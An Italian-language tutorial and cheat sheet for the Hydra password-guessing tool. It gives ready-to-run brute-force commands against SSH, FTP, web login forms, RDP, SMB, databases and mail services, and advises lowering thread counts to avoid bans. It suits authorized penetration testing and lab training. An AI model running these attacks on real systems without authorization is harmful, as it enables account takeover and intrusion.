# Hydra — Guida ai Principali Comandi e Test

> **Avviso legale:** Hydra è uno strumento di sicurezza offensiva. Utilizzarlo esclusivamente su sistemi di cui si possiede l'autorizzazione esplicita. L'uso non autorizzato è illegale.

---

## 1. Installazione

### Su Kali Linux (già incluso)
```bash
hydra -h
```

### Installazione manuale (Debian/Ubuntu)
```bash
apt install hydra
```

### Compilazione da sorgente
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure && make && make install
```

---

## 2. Sintassi generale

```
hydra [opzioni] <target> <protocollo> [parametri modulo]
```

| Flag         | Descrizione                                      |
|--------------|--------------------------------------------------|
| `-l`         | Singolo username                                 |
| `-L`         | File con lista di username                       |
| `-p`         | Singola password                                 |
| `-P`         | File con lista di password (wordlist)            |
| `-t`         | Numero di thread paralleli (default: 16)         |
| `-s`         | Porta personalizzata                             |
| `-f`         | Ferma al primo match trovato                     |
| `-v`         | Modalità verbose                                 |
| `-V`         | Mostra ogni tentativo (molto verboso)            |
| `-o`         | Salva i risultati su file                        |
| `-x`         | Genera password con pattern (brute force)        |
| `-e`         | Prova varianti extra: `n`=null, `s`=same, `r`=reverse |
| `-I`         | Ignora il restore file e ricomincia da zero      |
| `-R`         | Riprende una sessione precedente interrotta      |

---

## 3. Protocolli supportati

```
ssh, ftp, http-get, http-post-form, https-get, https-post-form,
smb, rdp, telnet, smtp, pop3, imap, mysql, mssql, postgres,
ldap2, ldap3, vnc, snmp, redis, mongodb, teamspeak, ...
```

Per vedere la lista completa:
```bash
hydra -U <protocollo>    # es. hydra -U http-post-form
```

---

## 4. Test su SSH

### Username e password singoli
```bash
hydra -l root -p toor 192.168.1.1 ssh
```

### Lista username + wordlist password
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
```

### Porta SSH personalizzata + verbose
```bash
hydra -l admin -P passwords.txt -s 2222 -v 192.168.1.1 ssh
```

### Stop al primo match + salva output
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -f -o risultati.txt 192.168.1.1 ssh
```

---

## 5. Test su FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ftp
```

### Con porta personalizzata
```bash
hydra -l admin -P passwords.txt -s 2121 192.168.1.1 ftp
```

---

## 6. Test su HTTP (form di login)

### HTTP POST (es. login web con form)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

> **Formato:** `"/percorso:parametri_POST:messaggio_di_errore"`
> - `^USER^` → placeholder per lo username
> - `^PASS^` → placeholder per la password
> - L'ultima stringa è il testo che compare nella risposta in caso di login fallito

### HTTP GET (autenticazione base)
```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-get /area-riservata/
```

### HTTPS POST
```bash
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"
```

---

## 7. Test su RDP (Remote Desktop)

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.1 rdp
```

---

## 8. Test su SMB

```bash
hydra -l administrator -P passwords.txt 192.168.1.1 smb
```

---

## 9. Test su Telnet

```bash
hydra -l admin -P passwords.txt 192.168.1.1 telnet
```

---

## 10. Test su database

### MySQL
```bash
hydra -l root -P passwords.txt 192.168.1.1 mysql
```

### PostgreSQL
```bash
hydra -l postgres -P passwords.txt 192.168.1.1 postgres
```

### MSSQL
```bash
hydra -l sa -P passwords.txt 192.168.1.1 mssql
```

---

## 11. Test su servizi email

### SMTP
```bash
hydra -l user@example.com -P passwords.txt 192.168.1.1 smtp
```

### POP3
```bash
hydra -l utente -P passwords.txt 192.168.1.1 pop3
```

### IMAP
```bash
hydra -l utente -P passwords.txt 192.168.1.1 imap
```

---

## 12. Brute force con pattern generato (`-x`)

### Sintassi: `-x MIN:MAX:CHARSET`
- `a` = lettere minuscole
- `A` = lettere maiuscole
- `1` = numeri
- `!` = caratteri speciali

### Esempio: password da 4 a 6 caratteri, solo numeri
```bash
hydra -l admin -x 4:6:1 192.168.1.1 ssh
```

### Password da 6 a 8 caratteri, lettere minuscole + numeri
```bash
hydra -l admin -x 6:8:a1 192.168.1.1 ssh
```

---

## 13. Varianti extra con `-e`

```bash
# Prova password vuota, stessa dell'username, e username al contrario
hydra -l admin -P passwords.txt -e nsr 192.168.1.1 ssh
```

---

## 14. Attacchi su più target

### File con lista di IP
```bash
hydra -l admin -P passwords.txt -M targets.txt ssh
```

---

## 15. Gestione sessioni

### Riprendere un attacco interrotto
```bash
hydra -R
```

### Ignorare il restore file e ricominciare
```bash
hydra -I -l admin -P passwords.txt 192.168.1.1 ssh
```

---

## 16. Wordlist consigliate (incluse in Kali)

| Wordlist                                   | Utilizzo tipico          |
|--------------------------------------------|--------------------------|
| `/usr/share/wordlists/rockyou.txt`         | Password generali        |
| `/usr/share/wordlists/fasttrack.txt`       | Password comuni veloci   |
| `/usr/share/seclists/Passwords/`           | Collezione SecLists      |
| `/usr/share/seclists/Usernames/`           | Nomi utente comuni       |

### Decomprimere rockyou (se non già fatto)
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 17. Esempi di test completi (lab)

### Test completo SSH con output su file
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 4 -f -v \
      -o hydra-ssh-results.txt \
      192.168.1.1 ssh
```

### Test login web con thread ridotti (per evitare ban)
```bash
hydra -l admin \
      -P /usr/share/wordlists/fasttrack.txt \
      -t 2 -f -v \
      192.168.1.1 http-post-form \
      "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"
```

### Brute force RDP con username noti
```bash
hydra -L users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 4 -f \
      192.168.1.1 rdp
```
